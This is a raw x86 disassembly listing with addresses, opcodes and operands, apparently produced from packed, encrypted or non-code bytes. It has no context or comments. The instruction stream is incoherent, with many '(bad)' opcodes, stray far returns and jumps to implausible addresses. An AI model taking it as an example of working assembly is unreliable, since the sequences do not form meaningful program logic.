  4309d9:	mov    edi,DWORD PTR [esi]
  4309db:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  4309e2:	test   DWORD PTR [edi-0x8],edx
  4309e5:	sbb    al,0x45
  4309e7:	add    BYTE PTR [eax],bh
  4309e9:	push   0x8b809c
  4309ee:	loopne 0x430a35
  4309f0:	push   ebp
  4309f1:	mov    esi,DWORD PTR [ebx]
  4309f3:	cld    
  4309f4:	add    eax,DWORD PTR [eax+0xf013b]
  4309fa:	adc    al,0x0
  4309fc:	add    bh,bh
  4309fe:	jmp    0xc00b1b
  430a03:	add    BYTE PTR [ebp+0x45],cl
  430a06:	mov    ecx,DWORD PTR [ebx+0xd1d8ec]
  430a0c:	dec    ebp
  430a0d:	push   0x38033
  430a12:	cmp    eax,DWORD PTR [eax]
  430a14:	unpcklps xmm7,xmm0
  430a17:	jne    0x430a19
  430a19:	dec    DWORD PTR [ebx+0x5545c818]
  430a1f:	mov    DWORD PTR [ebx],esi
  430a21:	shl    BYTE PTR [ebx],1
  430a23:	inc    ebp
  430a24:	add    ecx,DWORD PTR [ecx+0x60fcc03]
  430a2a:	retf   0x5575
  430a2d:	dec    DWORD PTR [ebx-0x5ba13e8]
  430a33:	(bad)  
  430a34:	stc    
  430a35:	loopne 0x430a43
  430a37:	test   DWORD PTR [ebp-0x8],ecx
  430a3a:	xor    eax,DWORD PTR [ebp+0x3]
  430a3d:	mov    ebp,ecx
  430a3f:	rol    BYTE PTR [eax],1
  430a41:	inc    ebp
  430a42:	add    BYTE PTR [eax-0x7747ab3],bh
  430a48:	clc    
  430a49:	inc    ebp
  430a4a:	retf   
  430a4b:	mov    edx,ebx
  430a4d:	loopne 0x430a25
  430a4f:	retf   
  430a50:	into   
  430a51:	into   
  430a52:	scas   eax,DWORD PTR es:[edi]
  430a53:	dec    ebp
  430a54:	mov    ecx,DWORD PTR [ebx-0x34821f0c]
  430a5a:	sub    ecx,esi
  430a5c:	cmp    ecx,DWORD PTR [ebp+0x77]
  430a5f:	(bad)  
  430a60:	mov    edi,eax
  430a62:	enter  0x8985,0xf8
  430a66:	add    BYTE PTR [ebp-0x75],al
  430a69:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  430a70:	xor    eax,DWORD PTR [ebp+0x4503f803]
  430a76:	(bad)  
  430a78:	retf   0x559c
  430a7b:	(bad)  
  430a7c:	mov    esp,DWORD PTR [esp+ebp*8-0x607057b]
  430a83:	inc    ebp
  430a84:	add    eax,0xeb9c4d3f
  430a89:	(bad)  
  430a8a:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  430a90:	xor    ecx,DWORD PTR [ebp+0x33]
  430a93:	mov    eax,DWORD PTR [ebx]
  430a95:	in     al,dx
  430a96:	add    ecx,ebx
  430a98:	bswap  esi
  430a9a:	retf   0x55d1
  430a9d:	test   BYTE PTR [ebx-0x5ff13fe],cl
  430aa3:	jmp    0x430a9e
  430aa5:	add    BYTE PTR ds:0xebf44d8b,al
  430aab:	push   ebp
  430aac:	mov    ebp,DWORD PTR [ebx]
  430aae:	mov    eax,0x33f8558b
  430ab3:	retf   
  430ab4:	xor    ecx,esi
  430ab6:	add    edx,ecx
  430ab8:	add    eax,DWORD PTR [edx+0xca010f]
  430abe:	push   ebp
  430abf:	dec    ebp
  430ac0:	mov    ecx,DWORD PTR [ebx-0x34050714]
  430ac6:	stc    
  430ac7:	rol    DWORD PTR ds:0xebce4dd6,cl
  430acd:	scas   eax,DWORD PTR es:[edi]
  430ace:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  430ad4:	xor    ebp,DWORD PTR [ebx]
  430ad6:	xor    edi,DWORD PTR [ebx]
  430ad8:	add    esi,DWORD PTR [edi+0x3]
  430adb:	mov    ecx,DWORD PTR [edi]
  430add:	clc    
  430ade:	retf   0x55cb
  430ae1:	into   
  430ae2:	mov    edi,DWORD PTR [esp+ebp*8-0x6740600]
  430ae9:	test   al,0x4d
  430aeb:	push   ebp
  430aec:	jbe    0x430b21
  430aee:	mov    esi,DWORD PTR [ebx]
  430af0:	mov    al,0x3
  430af2:	push   ebp
  430af3:	add    esi,DWORD PTR [ebx]
  430af5:	rdpmc  
  430af7:	retf   0x5503
  430afa:	add    ecx,DWORD PTR [ebx-0x53513f1]
  430b00:	dec    ebp
  430b01:	stc    
  430b02:	mov    ecx,DWORD PTR [eax]
  430b04:	or     BYTE PTR [ebp+0x4d],cl
  430b07:	jmp    0x1370b97
  430b0c:	dec    ebp
  430b0d:	dec    ebp
  430b0e:	(bad)  
  430b0f:	mov    esp,esp
  430b11:	clc    
  430b12:	test   ebx,ecx
  430b14:	clc    
  430b15:	ror    DWORD PTR [ebp-0x2a],cl
  430b18:	mov    esi,ecx
  430b1a:	lock scas eax,DWORD PTR es:[edi]
  430b1c:	inc    ebp
  430b1d:	mov    esi,DWORD PTR [ebx]
  430b1f:	hlt    
  430b20:	pushf  
  430b21:	jge    0x430aae
  430b23:	sub    esp,esp
  430b25:	cmp    ecx,ebx
  430b27:	ja     0x430af7
  430b29:	mov    ebp,DWORD PTR [eax-0x58]
  430b2c:	dec    ebp
  430b2d:	xor    ecx,DWORD PTR [di+0x3]
  430b31:	mov    ebp,eax
  430b33:	clc    
  430b34:	push   ebp
  430b35:	retf   
  430b36:	mov    dl,bl
  430b38:	adc    esi,edx
  430b3a:	jb     0x430b0a
  430b3c:	add    BYTE PTR [edi-0xb7474b3],ch
  430b42:	lock jge 0x430b10
  430b45:	sub    ecx,DWORD PTR [ebp+0x3b]
  430b48:	mov    esi,DWORD PTR [edi-0x28]
  430b4b:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
  430b52:	mov    BYTE PTR [ebx-0x34b20729],cl
  430b58:	mov    edx,ebx
  430b5a:	lock (bad) 
  430b5c:	ror    esi,cl
  430b5e:	push   ebp
  430b5f:	scas   eax,DWORD PTR es:[edi]
  430b60:	mov    ecx,DWORD PTR [ebx+0x7d8cf4d8]
  430b66:	fwait
  430b67:	sub    esi,DWORD PTR [edx]
  430b69:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430b6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430b70:	xor    esp,DWORD PTR [ebx]
  430b72:	add    ecx,DWORD PTR [ebp-0x18]
  430b75:	mov    edi,DWORD PTR [ebp-0x8]
  430b78:	mov    bl,cl
  430b7a:	cmp    dl,bl
  430b7c:	jb     0x430b4c
  430b7e:	add    dh,dl
  430b80:	dec    ebp
  430b81:	scas   eax,DWORD PTR es:[edi]
  430b82:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  430b88:	shr    DWORD PTR [ebx],cl
  430b8a:	into   
  430b8b:	cmp    edx,esi
  430b8d:	mov    ebp,DWORD PTR [edi-0x17fcfc48]
  430b93:	dec    ebp
  430b94:	dec    ebp
  430b95:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  430b9b:	retf   
  430b9c:	xor    edx,esi
  430b9e:	add    ecx,esi
  430ba0:	imul   ecx,edx
  430ba3:	mov    DWORD PTR [ebp+0x8],edx
  430ba6:	xor    ecx,DWORD PTR [ebp+0x2b]
  430ba9:	mov    DWORD PTR [ebx+0x7d4df0e0],ecx
  430baf:	add    esi,DWORD PTR [ebx]
  430bb1:	rol    BYTE PTR [ebx],0x45
  430bb4:	rdtsc  
  430bb6:	xlat   BYTE PTR ds:[ebx]
  430bb7:	pushf  
  430bb8:	jge    0x430b43
  430bba:	xor    ebx,eax
  430bbc:	sub    eax,DWORD PTR [ebp-0x73]
  430bbf:	(bad)  
  430bc0:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  430bc7:	dec    ebp
  430bc8:	xchg   BYTE PTR [ebx],dh
  430bca:	inc    DWORD PTR [ebx]
  430bcc:	(bad)  
  430bcd:	jmp    0x430c1c
  430bcf:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430bd5:	dec    ebp
  430bd6:	into   
  430bd7:	mov    ebp,DWORD PTR [edi-0x1b737428]
  430bdd:	fwait
  430bde:	shl    DWORD PTR [edx],cl
  430be0:	retf   0x5588
  430be3:	or     ecx,DWORD PTR [ebp+0x7233114d]
  430be9:	add    eax,DWORD PTR [eax]
  430beb:	call   0x8ace613d
  430bf0:	fcom   QWORD PTR [ecx]
  430bf2:	retf   
  430bf3:	jb     0x430c5a
  430bf5:	add    ch,cl
  430bf7:	dec    ebp
  430bf8:	sub    ecx,DWORD PTR [edx+0x55ec0b03]
  430bfe:	dec    ebp
  430bff:	xor    ecx,DWORD PTR [ebx-0x34170bfd]
  430c05:	jge    0x430bd5
  430c07:	mov    BYTE PTR [edi+0xf723b3a],ch
  430c0d:	add    cl,dh
  430c0f:	dec    ebp
  430c10:	dec    DWORD PTR [ebx-0x2c031b01]
  430c16:	inc    ebp
  430c17:	push   ebp
  430c18:	dec    DWORD PTR [ebx-0x73ff2734]
  430c1e:	lea    ebx,[ebx-0x7400cdac]
  430c24:	push   eax
  430c25:	mov    ah,0x45
  430c27:	push   ebp
  430c28:	mov    esi,DWORD PTR [ebx]
  430c2a:	les    esi,FWORD PTR [ebx]
  430c2c:	add    BYTE PTR [ebx],al
  430c2e:	inc    DWORD PTR [ebx]
  430c30:	mov    ecx,DWORD PTR [edi]
  430c32:	cld    
  430c33:	retf   0x4d80
  430c36:	add    DWORD PTR [ecx+0x4d30e800],ecx
  430c3c:	jne    0x430bc9
  430c3e:	jmp    eax
  430c40:	ror    bl,1
  430c42:	or     cl,dh
  430c44:	add    BYTE PTR [edi-0xf2f7475],ch
  430c4a:	not    bl
  430c4c:	adc    al,0xca
  430c4e:	inc    ebp
  430c4f:	push   ebp
  430c50:	mov    ecx,DWORD PTR [ebx-0x2cff1728]
  430c56:	push   0xaf80d6
  430c5b:	mov    eax,DWORD PTR [eax]
  430c5d:	in     al,0xff
  430c5f:	sti    
  430c60:	sbb    dh,cl
  430c62:	pop    esi
  430c63:	xchg   esp,eax
  430c64:	leave  
  430c65:	fwait
  430c66:	add    al,0x32
  430c68:	push   ebp
  430c69:	cmp    ebp,esp
  430c6b:	sqrtps xmm3,XMMWORD PTR [esi+0x4d]
  430c6f:	dec    DWORD PTR [ecx-0x740f0375]
  430c75:	push   ebp
  430c76:	cld    
  430c77:	xor    ebp,ebx
  430c79:	add    ecx,DWORD PTR [ebx-0x743576f1]
  430c7f:	push   ebp
  430c80:	clc    
  430c81:	xor    esi,ecx
  430c83:	add    esi,DWORD PTR [ebp-0x75]
  430c86:	(bad)  
  430c87:	hlt    
  430c88:	or     DWORD PTR [esi+eax*8-0x39cdf865],ecx
  430c8f:	mov    DWORD PTR [esi],eax
  430c91:	hlt    
  430c92:	(bad)  
  430c93:	dec    ebp
  430c94:	add    esi,DWORD PTR [ebx]
  430c96:	(bad)  
  430c97:	mov    edx,0xffc68d0a
  430c9c:	add    dl,cl
  430c9e:	leave  
  430c9f:	push   ebp
  430ca0:	push   ebp
  430ca1:	mov    ebp,esp
  430ca3:	fcom   QWORD PTR [ecx+0x7d]
  430ca6:	inc    ebp
  430ca7:	xor    ecx,DWORD PTR [ecx-0x74f003fd]
  430cad:	iret   
  430cae:	cld    
  430caf:	retf   0x868f
  430cb2:	loopne 0x430cb1
  430cb4:	mov    edi,edi
  430cb6:	mov    esi,DWORD PTR [ebp-0x8]
  430cb9:	mov    esi,eax
  430cbb:	cld    
  430cbc:	jne    0x430c6e
  430cbe:	mov    BYTE PTR [ecx],0xa
  430cc1:	add    dh,al
  430cc3:	test   DWORD PTR [eax],ecx
  430cc5:	inc    esi
  430cc7:	inc    DWORD PTR [edi]
  430cc9:	mov    eax,esi
  430ccb:	cld    
  430ccc:	add    DWORD PTR [eax+0x901c6],eax
  430cd2:	leave  
  430cd3:	xor    BYTE PTR [ebp+0x45],dl
  430cd6:	in     al,dx
  430cd7:	mov    edx,DWORD PTR [ecx-0x40]
  430cda:	inc    ebp
  430cdb:	add    BYTE PTR [ecx-0x74000301],cl
  430ce1:	int3   
  430ce2:	cld    
  430ce3:	jne    0x430c9d
  430ce5:	call   0xcc1ff0
  430cea:	mov    esi,DWORD PTR [ebp-0x8]
  430ced:	test   eax,esi
  430cef:	je     0x430d66
  430cf1:	mov    eax,esi
  430cf3:	cld    
  430cf4:	add    al,0x80
  430cf6:	add    WORD PTR [ecx+0x0],ax
  430cfa:	fiadd  DWORD PTR [eax]
  430cfc:	mov    BYTE PTR [eax],0x3d
  430cff:	push   0xffffffc3
  430d01:	push   esi
  430d02:	mov    edx,DWORD PTR [eax+0x51]
  430d05:	pop    edi
  430d06:	lea    ebx,[ebx-0x8]
  430d09:	ret    0x45
  430d0c:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430d12:	xchg   eax,edi
  430d14:	mov    DWORD PTR [ebp-0x75],ecx
  430d17:	push   esi
  430d18:	clc    
  430d19:	jne    0x430ceb
  430d1b:	mov    ecx,0xf8450b0b
  430d20:	(bad)  
  430d21:	push   cs
  430d22:	or     BYTE PTR [ebp-0x3a],dh
  430d25:	cmp    eax,DWORD PTR [ecx]
  430d27:	pop    esi
  430d28:	(bad)  
  430d29:	or     al,0x5
  430d2b:	inc    eax
  430d2c:	leave  
  430d2d:	jmp    0x40cf:0x25564204
  430d34:	leave  
  430d35:	in     eax,dx
  430d36:	inc    DWORD PTR [eax-0x75]
  430d39:	fimul  DWORD PTR [ebx-0x228139be]
  430d3f:	inc    eax
  430d40:	nop
  430d41:	loopne 0x430d42
  430d43:	ret    
  430d44:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430d4a:	add    eax,0xff45e8f8
  430d4f:	push   esi
  430d50:	push   DWORD PTR [ebp-0x39]
  430d53:	mov    eax,0x7edda46
  430d58:	or     al,0x6
  430d5a:	push   DWORD PTR [ebp-0x3a]
  430d5d:	cmp    eax,DWORD PTR [edx]
  430d5f:	pop    esi
  430d60:	ret    
  430d61:	or     al,0x56
  430d63:	inc    ecx
  430d64:	push   ebp
  430d65:	jle    0x430d53
  430d67:	inc    edx
  430d68:	inc    ebp
  430d69:	int    0x1
  430d6b:	inc    ecx
  430d6c:	sub    BYTE PTR ds:0xe77541fc,ah
  430d72:	add    DWORD PTR [edx+0x1c],eax
  430d75:	retf   0xc38b
  430d78:	adc    al,0x8b
  430d7a:	xchg   edx,eax
  430d7b:	push   ecx
  430d7c:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430d82:	rcl    DWORD PTR [esi-0x9],cl
  430d85:	jne    0x430dd7
  430d87:	mov    eax,0x7c80ece
  430d8c:	rol    DWORD PTR [esi],cl
  430d8e:	div    DWORD PTR [ebp+0x50]
  430d91:	cmp    ecx,edx
  430d93:	pop    esi
  430d94:	dec    BYTE PTR [edx]
  430d96:	in     al,dx
  430d97:	inc    edx
  430d98:	sub    esp,ecx
  430d9a:	inc    eax
  430d9b:	(bad)  
  430d9c:	push   eax
  430d9d:	add    edx,DWORD PTR [eax-0x1f]
  430da0:	push   edi
  430da1:	add    dh,dh
  430da3:	leave  
  430da4:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430da8:	add    BYTE PTR [ecx+0x0],dl
  430dab:	inc    ebp
  430dac:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430db2:	add    BYTE PTR [eax-0x7fbf448],bh
  430db8:	add    al,0x2
  430dba:	jmp    0x57eb914
  430dbf:	jne    0x430da9
  430dc1:	mov    eax,DWORD PTR [edx]
  430dc3:	or     BYTE PTR [eax],al
  430dc5:	inc    ecx
  430dc6:	stc    
  430dc7:	in     eax,dx
  430dc8:	ss inc eax
  430dca:	aas    
  430dcb:	out    0x7d,eax
  430dcd:	inc    ecx
  430dce:	mov    ebp,ecx
  430dd0:	lock ret 0x7d
  430dd4:	and    ecx,DWORD PTR [ebx-0x171777]
  430dda:	add    bh,bh
  430ddc:	aad    0xd7
  430dde:	add    dh,cl
  430de0:	clts   
  430de2:	(bad)  
  430de3:	call   0xffce0ce8
  430de8:	hlt    
  430de9:	iret   
  430dea:	jge    0x430dc2
  430dec:	rol    DWORD PTR [esi-0x80],cl
  430def:	jmp    0x1c5cfc
  430df4:	out    dx,al
  430df5:	mov    eax,DWORD PTR [ebx]
  430df7:	(bad)  
  430df8:	pop    esi
  430df9:	push   es
  430dfa:	cmp    al,0xe8
  430dfc:	sar    edi,0x8
  430dff:	inc    DWORD PTR [edi]
  430e01:	inc    esi
  430e02:	(bad)  
  430e03:	loopne 0x430e83
  430e05:	push   edi
  430e06:	push   cs
  430e07:	push   ebx
  430e08:	add    BYTE PTR [ebx+0x24008b56],cl
  430e0e:	add    BYTE PTR [ebp+0x50],al
  430e11:	push   eax
  430e12:	add    DWORD PTR [ebx+0x757d1834],ecx
  430e18:	sub    edx,DWORD PTR [esi-0x24]
  430e1b:	jne    0x430dd3
  430e1d:	lods   eax,DWORD PTR ds:[esi]
  430e1e:	mov    edx,DWORD PTR [edx-0x34]
  430e21:	dec    esi
  430e22:	out    0x83,eax
  430e24:	into   
  430e25:	push   edi
  430e27:	loopne 0x430df7
  430e29:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430e2d:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430e34:	rol    DWORD PTR [edx],0x8
  430e37:	mov    esp,ecx
  430e39:	cmp    DWORD PTR [ebx],0xc
  430e3c:	mov    esi,0x5001c0
  430e41:	push   eax
  430e42:	push   cs
  430e43:	push   eax
  430e44:	(bad)  
  430e45:	sub    edx,edi
  430e47:	push   esi
  430e48:	adc    al,0xcb
  430e4a:	ins    DWORD PTR es:[edi],dx
  430e4b:	mov    eax,0x203e8
  430e50:	add    al,ah
  430e52:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430e59:	add    dh,al
  430e5b:	add    ah,ch
  430e5d:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430e63:	pop    ecx
  430e64:	or     eax,ebx
  430e66:	cli    
  430e67:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430e6d:	lea    ebp,[ebx]
  430e6f:	mov    edx,DWORD PTR [edx-0x4]
  430e72:	dec    ecx
  430e73:	inc    ebp
  430e74:	shr    BYTE PTR [ebx],0x4b
  430e77:	and    al,0x0
  430e79:	(bad)  
  430e7a:	jne    0x430ec1
  430e7c:	pop    eax
  430e7d:	mov    al,0x5a
  430e7f:	call   0x14210de
  430e84:	and    al,0x85
  430e86:	push   edx
  430e87:	add    BYTE PTR [eax+eax*1+0x0],ah
  430e8b:	dec    ebp
  430e8c:	mov    cl,0x23
  430e8e:	jmp    0x430e7c
  430e90:	mov    al,0xe7
  430e92:	call   0x1391180
  430e97:	shr    DWORD PTR [eax+ebx*2],cl
  430e9a:	lock (bad) 
  430e9c:	adc    eax,0x757f008d
  430ea1:	out    0x58,eax
  430ea3:	cmp    al,0x7
  430ea5:	pop    edx
  430ea6:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430ead:	push   ecx
  430eae:	cld    
  430eaf:	mov    esi,0x3b0175
  430eb4:	and    al,0xb0
  430eb6:	xor    BYTE PTR [edx+0x1],0x8b
  430eba:	add    ah,bh
  430ebc:	mov    edi,DWORD PTR [ebp-0x4]
  430ebf:	psubsw mm7,QWORD PTR [edi]
  430ec2:	add    DWORD PTR [ebp+0x0],ebp
  430ec5:	rcr    eax,1
  430ec7:	mov    edi,ecx
  430ec9:	and    eax,DWORD PTR [eax]
  430ecb:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430ed1:	call   0x13011ba
  430ed6:	add    al,cl
  430ed8:	mov    ebp,esi
  430eda:	aam    0x83
  430edc:	or     DWORD PTR [ecx],eax
  430ede:	jne    0x430ed1
  430ee0:	mov    eax,DWORD PTR [eax]
  430ee2:	aam    0x0
  430ee4:	dec    ebp
  430ee5:	jne    0x430e72
  430ee7:	cmp    ebx,eax
  430ee9:	jb     0x430f38
  430eeb:	jmp    0x430e78
  430eed:	mov    ebx,esp
  430eef:	int3   
  430ef0:	dec    ebp
  430ef1:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430ef8:	mov    edx,0x8b0a8b
  430efd:	cmp    ecx,DWORD PTR [eax]
  430eff:	jb     0x430ed8
  430f01:	pop    edx
  430f02:	push   edi
  430f03:	cli    
  430f04:	pop    es
  430f05:	mov    eax,ecx
  430f07:	jb     0x430f0b
  430f09:	add    DWORD PTR [ebx],0xa
  430f0c:	mov    eax,DWORD PTR [ebx]
  430f0e:	int3   
  430f0f:	add    bh,BYTE PTR [esi+0x75d10006]
  430f15:	jmp    0x430ea2
  430f17:	mov    al,0xe8
  430f19:	call   0x104119b
  430f1e:	add    edx,DWORD PTR [ecx+ecx*8]
  430f21:	pop    edi
  430f22:	or     BYTE PTR [ecx-0x73],bl
  430f25:	pop    ecx
  430f26:	inc    edi
  430f27:	xor    al,0xeb
  430f29:	push   ecx
  430f2a:	mov    edi,DWORD PTR [edx+0xc506cc]
  430f30:	call   0xb21035
  430f35:	int3   
  430f36:	sbb    BYTE PTR [esi],ch
  430f38:	inc    ebp
  430f39:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430f3f:	call   0x9c11ae
  430f44:	or     BYTE PTR [ebx-0x73],dl
  430f47:	cmp    al,0x47
  430f49:	mov    al,0x1
  430f4b:	jb     0x430f4d
  430f4d:	mov    al,0x10
  430f4f:	push   eax
  430f50:	add    al,0x75
  430f52:	add    BYTE PTR [ebx],ch
  430f54:	add    ebx,esp
  430f56:	int3   
  430f57:	jne    0x430f69
  430f59:	movsx  edx,cl
  430f5c:	add    DWORD PTR [eax],eax
  430f5e:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430f65:	mov    gs,edi
  430f67:	add    BYTE PTR [eax-0x50],ch
  430f6a:	add    al,ch
  430f6c:	mov    eax,DWORD PTR [ecx]
  430f6e:	sub    eax,DWORD PTR [eax]
  430f70:	jb     0x430fe7
  430f72:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430f76:	jge    0x430f60
  430f78:	add    al,0x1
  430f7a:	add    DWORD PTR [eax],0x0
  430f7d:	jne    0x430f7f
  430f7f:	je     0x430fc6
  430f81:	mov    eax,DWORD PTR [edi]
  430f83:	ror    BYTE PTR [ebp+0x4d],1
  430f86:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430f8d:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430f93:	mov    DWORD PTR [ebx],ebp
  430f95:	fadd   DWORD PTR [eax+0x75]
  430f98:	inc    eax
  430f99:	pop    eax
  430f9a:	lea    ebx,[ecx+0x4f]
  430f9d:	push   0xb1000003
  430fa2:	out    dx,eax
  430fa3:	add    ebp,DWORD PTR [edx+edx*2]
  430fa6:	add    BYTE PTR [ebx+ecx*4],bh
  430fa9:	mov    ch,BYTE PTR [ebx]
  430fab:	jb     0x43101f
  430fad:	add    al,0x89
  430faf:	push   eax
  430fb0:	call   0x842b5d22
  430fb5:	add    DWORD PTR [eax+eax*1],eax
  430fb8:	jae    0x430fce
  430fba:	icebp  
  430fbb:	inc    ebp
  430fbc:	mov    eax,DWORD PTR gs:[ecx]
  430fbf:	int3   
  430fc0:	out    dx,al
  430fc1:	loopne 0x431010
  430fc3:	sub    eax,DWORD PTR [edx]
  430fc5:	push   0xffffff83
  430fc7:	pop    esi
  430fc8:	push   cs
  430fc9:	jl     0x430fe4
  430fcb:	add    al,0xaf
  430fcd:	xor    eax,0x832b6d00
  430fd2:	mov    eax,DWORD PTR [edx]
  430fd4:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430fda:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430fe0:	inc    ebp
  430fe1:	shr    ebx,0x3
  430fe4:	or     DWORD PTR [eax],0x4
  430fe7:	push   0xffffffa5
  430fe9:	pop    esi
  430fea:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  430ff1:	jmp    0x431050
  430ff3:	mov    edi,0xff0272
  430ff8:	fdivr  QWORD PTR [ebp+0x5d]
  430ffb:	push   0x4e
  430ffd:	pop    ecx
  430ffe:	call   0x435403
  431003:	mov    DWORD PTR [ebx],eax
  431005:	in     al,0xc8
  431007:	rol    BYTE PTR [ebp-0x75],0xc1
  43100b:	call   0xad11ec
  431010:	pop    esi
  431011:	enter  0xceff,0x8b
  431015:	repz mov ecx,DWORD PTR [ebp-0x34]
  431019:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  431020:	je     0x431022
  431022:	or     DWORD PTR [ebx-0x74183b24],eax
  431028:	jne    0x43100e
  43102a:	jmp    0x431025
  43102c:	push   DWORD PTR [edx-0x24]
  43102f:	push   0x4d
  431031:	pop    ecx
  431032:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  431036:	jge    0x43103e
  431038:	mov    eax,eax
  43103a:	sub    ebp,DWORD PTR [edx+0x24]
  43103d:	pop    esi
  43103e:	inc    ebp
  43103f:	mov    esp,0x8b6077
  431044:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  43104a:	lods   al,BYTE PTR ds:[esi]
  43104b:	add    BYTE PTR [ebx],bh
  43104d:	enter  0xce73,0x49
  431051:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  431059:	stc    
  43105a:	jge    0x4310ce
  43105c:	jnp    0xdd4293cb
  431062:	call   0xc61138
  431067:	fadd   st(0),st
  431069:	dec    esi
  43106a:	ins    BYTE PTR es:[edi],dx
  43106b:	stc    
  43106c:	cmp    al,0x73
  43106e:	push   ebp
  43106f:	mov    eax,0xf8028b
  431074:	jne    0x431037
  431076:	mov    esi,ecx
  431078:	mov    esp,DWORD PTR [ebp+0x2c]
  43107b:	add    edi,DWORD PTR [ebp-0x24]
  43107e:	sub    esp,eax
  431080:	and    al,0x45
  431082:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  431088:	sbb    al,0xee
  43108a:	pop    esi
  43108b:	call   0x8310bb
  431090:	fsubr  st,st(3)
  431092:	sti    
  431093:	add    BYTE PTR gs:[ecx],bh
  431096:	add    eax,esp
  431098:	add    DWORD PTR [esi],eax
  43109a:	rol    DWORD PTR [ebp+0x8],0x29
  43109e:	mov    esp,eax
  4310a0:	clc    
  4310a1:	jne    0x431118
  4310a3:	mov    eax,0x8b0673
  4310a8:	loopne 0x4310ef
  4310aa:	loopne 0x431035
  4310ac:	lods   al,BYTE PTR ds:[esi]
  4310ad:	int3   
  4310ae:	inc    ebp
  4310af:	mov    DWORD PTR gs:[eax+edi*8],eax
  4310b3:	add    al,0xc3
  4310b5:	sub    ecx,DWORD PTR [ebp+0x47]
  4310b8:	(bad)  
  4310ba:	shr    BYTE PTR [ebp-0x1f],0xe8
  4310be:	add    eax,DWORD PTR [eax]
  4310c0:	call   0x644d1c5
  4310c5:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4310cb:	dec    esi
  4310cc:	ins    DWORD PTR es:[edi],dx
  4310cd:	in     al,dx
  4310ce:	lea    eax,[eax]
  4310d0:	inc    ebp
  4310d1:	inc    ebp
  4310d2:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4310d8:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4310e2:	and    al,0xdc
  4310e4:	ror    DWORD PTR [edx+0x24],0xf7
  4310e8:	or     BYTE PTR [ebp+0x4c],dh
  4310eb:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  4310ef:	stos   BYTE PTR es:[edi],al
  4310f0:	adc    edx,edi
  4310f2:	inc    esp
  4310f3:	add    edi,DWORD PTR [eax]
  4310f5:	jne    0x4310da
  4310f7:	mov    DWORD PTR [eax-0x7449db04],ecx
  4310fd:	cmp    ecx,DWORD PTR [edi]
  4310ff:	sub    BYTE PTR [ebp-0x7e],dl
  431102:	sar    ebp,0xb
  431105:	jmp    FWORD PTR [edi+0x2400392a]
  43110b:	sub    esi,DWORD PTR [ebx-0x73]
  43110e:	mov    esp,DWORD PTR [ecx+edi*4]
  431111:	mov    ecx,DWORD PTR [eax]
  431113:	and    BYTE PTR [eax],al
  431115:	jne    0x4310e1
  431117:	sub    ebp,ecx
  431119:	sbb    BYTE PTR [esi+0x32],ah
  43111c:	dec    ebp
  43111d:	push   ebp
  43111e:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  431124:	ret    
  431125:	mov    edx,ebp
  431127:	leave  
  431128:	sub    DWORD PTR [esi+0x24],ebx
  43112b:	ret    0x2b
  43112e:	pop    ax
  431130:	push   ebp
  431131:	rol    BYTE PTR [ebx],0xeb
  431134:	add    DWORD PTR [ecx+0x6c0001],0x40
  43113b:	jb     0x431192
  43113d:	ret    
  43113e:	in     al,dx
  43113f:	jecxz  0x4310cc
  431141:	push   esi
  431142:	xchg   esp,eax
  431143:	jne    0x431145
  431145:	cmp    edx,DWORD PTR [esi+0x1c]
  431148:	jne    0x43112e
  43114a:	mov    eax,DWORD PTR [ebp-0x77]
  43114d:	ror    DWORD PTR [ebx+0x899408],0xe0
  431154:	mov    esi,DWORD PTR [ebp-0x75]
  431157:	pop    esi
  431158:	nop
  431159:	mov    eax,DWORD PTR [eax]
  43115b:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  431161:	add    al,0x0
  431163:	inc    ebp
  431164:	mov    eax,DWORD PTR [ebx]
  431166:	mov    ebp,ebx
  431168:	cmp    al,0xf
  43116a:	or     al,al
  43116c:	inc    ebp
  43116d:	inc    ebp
  43116e:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  431174:	cld    
  431175:	add    BYTE PTR [edi+0x546c16c0],dh
  43117b:	add    BYTE PTR [ecx-0x5],dl
  43117e:	add    eax,0x17200
  431183:	sbb    al,0x85
  431185:	dec    esp
  431186:	je     0x4311c0
  431188:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
